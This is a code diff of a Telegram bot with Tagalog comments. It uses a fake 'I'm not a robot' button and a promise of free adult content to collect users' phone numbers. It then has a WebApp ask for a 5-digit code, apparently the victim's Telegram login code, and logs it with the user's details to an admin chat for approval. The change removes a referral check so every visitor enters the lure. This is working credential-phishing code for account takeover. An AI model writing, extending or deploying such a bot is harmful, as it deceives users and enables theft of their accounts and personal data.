@@ -4,7 +4,6 @@ import { Telegraf } from "telegraf";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const WEBAPP_URL = process.env.WEBAPP_URL;
-const WEBSITE_URL = process.env.WEBSITE_URL;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
 if (!BOT_TOKEN) {
@@ -38,29 +37,24 @@ function stopTypingLoop(userId) {
   }
 }
 
-// /start handler - Eto yung flow na gusto mo
+// ==========================================
+// 1. /START HANDLER (Tulad ng sa Unang Picture)
+// ==========================================
 bot.start(async (ctx) => {
-  const payload = ctx.startPayload;
-
-  if (payload !== "from_website") {
-    const msg = await ctx.reply(
-      "Visit link to start verification:\n" + WEBSITE_URL
-    );
-    scheduleDelete(ctx.chat.id, msg.message_id);
-    return;
-  }
-
-  // Ilalabas natin yung message mo, tapos yung CONTACT REQUEST button ay nakapangalan na "Hindi ako robot!"
+  // Tinanggal na natin ang pag-check ng payload.
+  // Diretso na agad sa pagpapakita ng message at contact request button.
+  
   const msg = await ctx.reply(
     "🔞 Upang ma-access ang mga file nang libre 💦\n" +
-    "👇 Siguraduhing hindi ka robot",
+    "👇 Siguraduhing hindi ka robot\n\n" +
+    "👇", // Representation ng malaking pointing down emoji
     {
       reply_markup: {
         keyboard: [
           [
             {
               text: "✅ Hindi ako robot!",
-              request_contact: true, // Eto yung kukuha ng number pag tinap
+              request_contact: true, // IBINALIK: Ito ang magpa-popup para kunin ang contact
             },
           ],
         ],
@@ -72,13 +66,16 @@ bot.start(async (ctx) => {
   scheduleDelete(ctx.chat.id, msg.message_id);
 });
 
-// Kapag tinap nila yung "✅ Hindi ako robot!" (Ipapasa ang contact)
+// ==========================================
+// 2. CONTACT HANDLER (Pagkatapos i-tap ang "Hindi ako robot!")
+// ==========================================
 bot.on("contact", async (ctx) => {
   const contact = ctx.message.contact;
   if (!contact) return;
 
   scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);
 
+  // Siguraduhing sariling contact nila
   if (contact.user_id && contact.user_id !== ctx.from.id) {
     const warn = await ctx.reply(
       "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
@@ -87,10 +84,10 @@ bot.on("contact", async (ctx) => {
     return;
   }
 
-  // 1. I-save yung number!
+  // I-save ang number
   userPhones.set(ctx.from.id, contact.phone_number);
 
-  // 2. Tanggalin yung button sa baba para malinis
+  // Tanggalin ang keyboard sa ibaba para malinis
   const reply = await ctx.reply("⏳ Naglo-load...", {
     reply_markup: {
       remove_keyboard: true,
@@ -98,9 +95,9 @@ bot.on("contact", async (ctx) => {
   });
   scheduleDelete(ctx.chat.id, reply.message_id, 2000);
 
-  // 3. Ilabas na yung WebApp button para makapag-submit sila ng 5-digit code sa website
+  // Ilabas ang WebApp Button para makapag-submit na ng code
   const webappMsg = await ctx.reply(
-    "✅ Verified! Pindutin ang button sa ibaba para ipagpatuloy ang pag-verify at ilagay ang code.",
+    "✅ Verified! Pindutin ang button sa ibaba upang ilagay ang code at ma-access ang VIP group.",
     {
       reply_markup: {
         inline_keyboard: [
@@ -117,7 +114,9 @@ bot.on("contact", async (ctx) => {
   scheduleDelete(ctx.chat.id, webappMsg.message_id);
 });
 
-// HTTP server
+// ==========================================
+// HTTP SERVER & API
+// ==========================================
 const app = express();
 
 app.use(cors({
@@ -135,7 +134,7 @@ app.use(cors({
 app.use(express.json());
 app.options('*', cors());
 
-// API endpoint na tinatawag ng WebApp (kasama na ulit ang phone number dito)
+// API endpoint na tinatawag ng WebApp
 app.post("/api/log-code", async (req, res) => {
   console.log("Received /api/log-code body:", req.body);
 
@@ -149,7 +148,7 @@ app.post("/api/log-code", async (req, res) => {
   const username = tgUser?.username || "N/A";
   const firstName = tgUser?.first_name || "";
   
-  // Kunin ulit ang number na na-save kanina
+  // Kukunin ulit ang phone number mula sa memory
   const telegramPhone = userId && userPhones.get(userId) ? userPhones.get(userId) : "N/A";
 
   const displayName =
@@ -207,7 +206,9 @@ app.post("/api/log-code", async (req, res) => {
   }
 });
 
-// handle admin Approve/Reject buttons
+// ==========================================
+// ADMIN CALLBACK HANDLER
+// ==========================================
 bot.on("callback_query", async (ctx) => {
   const data = ctx.callbackQuery.data;
   if (!data) return;
